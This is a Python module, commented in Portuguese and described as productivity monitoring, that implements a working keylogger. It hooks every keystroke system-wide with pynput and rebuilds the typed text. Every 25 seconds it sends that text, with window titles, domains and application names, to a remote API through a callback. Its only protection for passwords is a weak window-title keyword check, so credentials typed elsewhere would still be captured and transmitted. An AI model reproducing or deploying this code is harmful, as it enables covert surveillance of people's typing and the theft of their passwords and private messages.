# keylogger.py - Captura texto digitado para envio à API (busca e alinhamento com timeline).
# Uso: monitoramento de produtividade; nao capturar em campos de senha quando possivel.

import threading
import time
from datetime import datetime
import pytz

KEYLOG_BUFFER_INTERVAL = 25  # segundos entre envios
KEYLOG_MAX_BUFFER = 2000    # max caracteres por lote (evita payload grande)
KEYLOG_SKIP_TITLES = ('password', 'senha', 'contrase', 'pin ')  # titulos que sugerem campo sensivel

_keylog_buffer = []
_keylog_lock = threading.Lock()
_keylog_stop = threading.Event()
_keylog_thread = None
_keylog_listener = None
_get_window_info_cb = None
_send_entries_cb = None
_usuario_monitorado_id_ref = None  # lista [id] ou None
_tz = pytz.timezone('America/Sao_Paulo')


def _on_press(key):
    try:
        k = key.char
        if k and k.isprintable() or k == ' ' or k == '\t' or k == '\n' or k == '\r':
            with _keylog_lock:
                _keylog_buffer.append(('char', k, time.time()))
    except AttributeError:
        if key == key.backspace:
            with _keylog_lock:
                _keylog_buffer.append(('back', None, time.time()))


def _flush_buffer():
    with _keylog_lock:
        if not _keylog_buffer:
            return []
        # Reconstruir texto (chars e backspace)
        text_parts = []
        for typ, val, ts in _keylog_buffer:
            if typ == 'char':
                text_parts.append(val)
            elif typ == 'back' and text_parts:
                text_parts.pop()
        text = ''.join(text_parts)
        captured_at = datetime.fromtimestamp(_keylog_buffer[0][2], tz=_tz).isoformat()
        del _keylog_buffer[:]
    if not text.strip():
        return []
    # Limitar tamanho
    if len(text) > KEYLOG_MAX_BUFFER:
        text = text[-KEYLOG_MAX_BUFFER:]
    win = _get_window_info_cb() if _get_window_info_cb else {}
    window_title = (win.get('window_title') or '')[:500]
    # Opcional: nao enviar se titulo sugerir campo de senha
    if any(s in (window_title or '').lower() for s in KEYLOG_SKIP_TITLES):
        return []
    entry = {
        'captured_at': captured_at,
        'text_content': text,
        'window_title': window_title,
        'domain': (win.get('domain') or '')[:255],
        'application': (win.get('application') or '')[:100]
    }
    return [entry]


def _keylog_worker():
    while not _keylog_stop.wait(timeout=KEYLOG_BUFFER_INTERVAL):
        uid = _usuario_monitorado_id_ref[0] if _usuario_monitorado_id_ref else None
        if uid is None or not _send_entries_cb:
            continue
        entries = _flush_buffer()
        if entries:
            try:
                _send_entries_cb(uid, entries)
            except Exception:
                pass


def start_keylogger(get_window_info_cb, send_entries_cb, usuario_monitorado_id_ref):
    """Inicia o keylogger em background. get_window_info_cb() -> dict, send_entries_cb(uid, entries)."""
    global _keylog_thread, _keylog_listener, _get_window_info_cb, _send_entries_cb, _usuario_monitorado_id_ref
    stop_keylogger()
    _get_window_info_cb = get_window_info_cb
    _send_entries_cb = send_entries_cb
    _usuario_monitorado_id_ref = usuario_monitorado_id_ref
    _keylog_stop.clear()
    try:
        from pynput import keyboard
    except ImportError:
        return False
    _keylog_listener = keyboard.Listener(on_press=_on_press)
    _keylog_listener.start()
    _keylog_thread = threading.Thread(target=_keylog_worker, daemon=True)
    _keylog_thread.start()
    return True


def stop_keylogger():
    global _keylog_thread, _keylog_listener
    _keylog_stop.set()
    if _keylog_listener is not None:
        try:
            _keylog_listener.stop()
        except Exception:
            pass
        _keylog_listener = None
    if _keylog_thread is not None:
        _keylog_thread = None
